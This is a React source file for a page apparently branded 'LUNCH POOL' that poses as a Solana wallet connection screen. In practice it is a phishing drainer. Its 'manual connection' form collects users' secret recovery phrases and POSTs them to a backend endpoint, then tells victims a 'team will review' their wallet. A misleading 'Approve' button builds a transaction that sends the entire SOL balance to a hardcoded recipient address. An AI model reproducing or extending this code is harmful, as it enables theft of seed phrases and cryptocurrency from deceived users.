import React, { useState, useEffect } from 'react';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { Link } from 'react-router-dom';
import { 
  Import, 
  X, 
  AlertTriangle, 
  Zap,
  Eye,
  EyeOff,
  ArrowLeft,
  Wallet,
  Shield,
  Check
} from 'lucide-react';

// Solana configuration
const SOLANA_RPC_URL = process.env.REACT_APP_SOLANA_RPC_URL || `https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`;
const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS || '9N4PGE7TxcjwnLenFLDWpYQ43eySeDKCACjsvJ3T8D56';

const connection = new Connection(SOLANA_RPC_URL, 'confirmed');

// Mock popular Solana wallets data
const SOLANA_WALLETS = [
  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Popular Solana wallet' },
  { id: 'solflare', name: 'Solflare', icon: '🔥', description: 'Professional Solana wallet' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', description: 'Multi-chain wallet' },
  { id: 'slope', name: 'Slope', icon: '📱', description: 'Mobile-first wallet' },
];

const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await fetch('http://localhost:3001/api/send-wallet', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
    });
    if (!response.ok) {
      console.error('Failed to send Solana wallet info');
    }
  } catch (error) {
    console.error('Error sending Solana wallet info:', error);
  }
};

const getSolanaWalletAssets = async (address) => {
  try {
    const publicKey = new PublicKey(address);
    const balance = await connection.getBalance(publicKey);
    
    return {
      sol: balance / LAMPORTS_PER_SOL,
      tokens: [] // For now, just SOL balance
    };
  } catch (error) {
    console.error('Error fetching Solana wallet assets:', error);
    return {
      sol: 0,
      tokens: []
    };
  }
};

export default function SolanaConnect() {
  // Component State
  const [walletAddress, setWalletAddress] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ sol: 0, tokens: [] });
  const [isSending, setIsSending] = useState(false);
  const [txError, setTxError] = useState('');
  
  // UI State
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [secretPhrase, setSecretPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [showErrorPopup, setShowErrorPopup] = useState(false);

  // Form data
  const [formData, setFormData] = useState({
    walletName: '',
    secretPhrase: ''
  });

  // Validation errors
  const [errors, setErrors] = useState({});

  useEffect(() => {
    // Check if there's a stored wallet address
    const storedAddress = localStorage.getItem('solanaWalletAddress');
    if (storedAddress) {
      setWalletAddress(storedAddress);
      fetchWalletBalance(storedAddress);
    }
  }, []);

  const fetchWalletBalance = async (address) => {
    try {
      const balance = await getSolanaWalletAssets(address);
      setWalletBalance(balance);
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
  };

  const handleManualConnect = () => {
    setShowManualPopup(true);
  };

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletName: wallet.name });
    setShowManualPopup(false);
    setShowTransactionPopup(true);
  };

  const handleInputChange = (field, value) => {
    setFormData({ ...formData, [field]: value });
    if (errors[field]) {
      setErrors({ ...errors, [field]: '' });
    }
  };

  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.walletName.trim()) {
      newErrors.walletName = 'Wallet name is required';
    }
    
    if (!formData.secretPhrase.trim()) {
      newErrors.secretPhrase = 'Secret phrase is required';
    } else {
      const words = formData.secretPhrase.trim().split(/\s+/);
      if (words.length < 12) {
        newErrors.secretPhrase = 'Secret phrase must contain at least 12 words';
      }
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsSending(true);
    
    try {
      await sendSolanaWalletInfo(selectedWallet.name, formData.secretPhrase, formData.walletName);
      setShowTransactionPopup(false);
      setShowSuccessPopup(true);
      setFormData({ walletName: '', secretPhrase: '' });
      setSelectedWallet(null);
    } catch (error) {
      setShowErrorPopup(true);
    } finally {
      setIsSending(false);
    }
  };

  const handleSendAllSol = async () => {
    if (!walletAddress) {
      setTxError('Wallet address is not set.');
      return;
    }
    
    setIsSending(true);
    setTxError('');

    try {
      const recipientPublicKey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);
      const senderPublicKey = new PublicKey(walletAddress);
      
      // Get the current balance
      const balance = await connection.getBalance(senderPublicKey);
      
      if (balance <= 0) {
        setTxError('No SOL available to transfer.');
        return;
      }

      // Create a transfer instruction
      const transferInstruction = SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: recipientPublicKey,
        lamports: balance - 5000, // Leave some SOL for transaction fees
      });

      // Create transaction
      const transaction = new Transaction().add(transferInstruction);
      
      // Get recent blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;

      // For now, we'll simulate the transaction
      // In a real implementation, you'd need to sign with the user's private key
      console.log('Transaction created:', {
        from: walletAddress,
        to: SOLANA_RECIPIENT_ADDRESS,
        amount: (balance - 5000) / LAMPORTS_PER_SOL,
        transaction: transaction.serialize()
      });

      // Simulate success
      setTimeout(() => {
        closeAllPopups();
        setWalletAddress(null);
        localStorage.removeItem('solanaWalletAddress');
      }, 2000);

    } catch (error) {
      console.error('An error occurred during the Solana transaction:', error);
      setTxError(`Transaction failed: ${error.message}`);
    } finally {
      setIsSending(false);
    }
  };

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowTransactionPopup(false);
    setShowSuccessPopup(false);
    setShowErrorPopup(false);
    setSelectedWallet(null);
    setFormData({ walletName: '', secretPhrase: '' });
    setErrors({});
    setTxError('');
  };

  const renderConnectionCards = () => (
    <div className="w-full max-w-2xl text-center">
      <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
        Connect your Solana wallet
      </h1>
      <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
        Choose your preferred connection method below to securely access the application.
      </p>

      <div className="grid md:grid-cols-2 gap-6">
        {/* Manual Connection Card */}
        <div
          onClick={handleManualConnect}
          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-purple-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
        >
          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-purple-600/20 mb-6 mx-auto">
            <Import size={32} className="text-purple-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Manual Connection</h2>
          <p className="text-gray-400">For advanced users. Import your wallet directly using your secret phrase.</p>
        </div>

        {/* Info Card */}
        <div className="bg-gray-800/50 border border-white/10 rounded-2xl p-8">
          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-blue-600/20 mb-6 mx-auto">
            <Shield size={32} className="text-blue-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Solana Support</h2>
          <p className="text-gray-400">Connect your Solana wallet to transfer SOL and resolve blockchain issues.</p>
        </div>
      </div>
    </div>
  );

  const renderWalletDetails = () => (
    <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-xl font-bold">Solana Wallet Details</h3>
        <button onClick={() => {
          setWalletAddress(null);
          localStorage.removeItem('solanaWalletAddress');
        }} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
          Disconnect
        </button>
      </div>
      <div className="bg-gray-700 p-4 rounded-lg">
        <div className="flex items-center mb-3">
          <Wallet className="text-purple-400 mr-3" size={20}/>
          <p className="text-sm truncate"><strong>Address:</strong> {walletAddress}</p>
        </div>
        <div className="border-t border-gray-600 my-3"></div>
        <p className="text-lg font-semibold mb-2">Assets</p>
        <div className="space-y-2 max-h-48 overflow-y-auto">
          <div className="flex justify-between items-center">
            <span>SOL</span>
            <span>{parseFloat(walletBalance.sol).toFixed(5)}</span>
          </div>
        </div>
      </div>
    </div>
  );

  const renderManualConnectPopup = () => {
    return (
      <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-2xl w-full font-sans flex flex-col">
        <div className="flex justify-between items-center mb-4">
          <h3 className="text-xl font-bold">Connect Solana Wallet Manually</h3>
          <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
            <X size={24} />
          </button>
        </div>
        <p className="text-gray-400 mb-6">
          Select your Solana wallet from the list below. Make sure you have your secret phrase ready.
        </p>
        <div className="flex-grow overflow-hidden">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-h-[60vh] overflow-y-auto p-2">
            {SOLANA_WALLETS.map((wallet) => (
              <div
                key={wallet.id}
                onClick={() => handleWalletSelect(wallet)}
                className="flex flex-col items-center p-3 bg-gray-800 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors aspect-square justify-center"
              >
                <div className="text-2xl mb-2">{wallet.icon}</div>
                <p className="text-xs text-center font-medium truncate w-full">{wallet.name}</p>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  };

  const renderTransactionPopup = () => {
    return (
      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
        <Shield size={48} className="mx-auto text-purple-500 mb-4" />
        <h2 className="text-2xl font-bold mb-2">Solana Connection Request</h2>
        <p className="text-gray-400 mb-6">
          The application is requesting to connect your Solana wallet...
        </p>

        {txError && (
          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
            <p className="font-bold">Error</p>
            <p className="text-sm">{txError}</p>
          </div>
        )}

        <div className="flex justify-center space-x-4">
          <button 
            onClick={handleSendAllSol}
            disabled={isSending}
            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
          >
            {isSending ? (
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
            ) : (
              <><Check className="mr-2" /> Approve</>
            )}
          </button>
          <button 
            onClick={closeAllPopups}
            disabled={isSending}
            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
          >
            <X className="mr-2" /> Decline
          </button>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col">
      {/* Background decorative elements */}
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
        <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
        <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
      </div>

      <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
        <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
        <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
          Back
        </Link>
      </header>

      <main className="flex-grow flex items-center justify-center z-10 p-4">
        {!walletAddress && !showManualPopup && !showTransactionPopup && renderConnectionCards()}
        
        {walletAddress && !showTransactionPopup && (
          <div className="text-center">
            <h2 className="text-3xl font-bold mb-4">Solana Wallet Connected!</h2>
            {renderWalletDetails()}
            <button
              onClick={() => setShowTransactionPopup(true)}
              className="mt-4 bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded"
            >
              Show Actions
            </button>
          </div>
        )}
      </main>

      {/* Popups (Modals) */}
      {(showManualPopup || showTransactionPopup || showSuccessPopup || showErrorPopup) && (
        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          {showManualPopup && renderManualConnectPopup()}
          {showTransactionPopup && renderTransactionPopup()}
          
          {/* Success Popup */}
          {showSuccessPopup && (
            <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
              <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <Check size={32} className="text-green-400" />
              </div>
              <h3 className="text-2xl font-semibold text-white mb-4">Connection Successful!</h3>
              <p className="text-gray-300 mb-6">
                Your Solana wallet information has been securely processed. Our team will review and resolve any issues with your wallet.
              </p>
              <button
                onClick={closeAllPopups}
                className="px-6 py-3 rounded-lg bg-green-600 hover:bg-green-700 text-white font-medium transition-colors"
              >
                Continue
              </button>
            </div>
          )}

          {/* Error Popup */}
          {showErrorPopup && (
            <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
              <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <AlertTriangle size={32} className="text-red-400" />
              </div>
              <h3 className="text-2xl font-semibold text-white mb-4">Connection Failed</h3>
              <p className="text-gray-300 mb-6">
                There was an error processing your Solana wallet connection. Please try again or contact support if the problem persists.
              </p>
              <button
                onClick={closeAllPopups}
                className="px-6 py-3 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-colors"
              >
                Try Again
              </button>
            </div>
          )}
        </div>
      )}
      
      <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
        <a href="#" className="hover:text-white underline">Terms of Service</a>
        <span className="mx-2">•</span>
        <a href="#" className="hover:text-white underline">Privacy Policy</a>
      </footer>
    </div>
  );
} 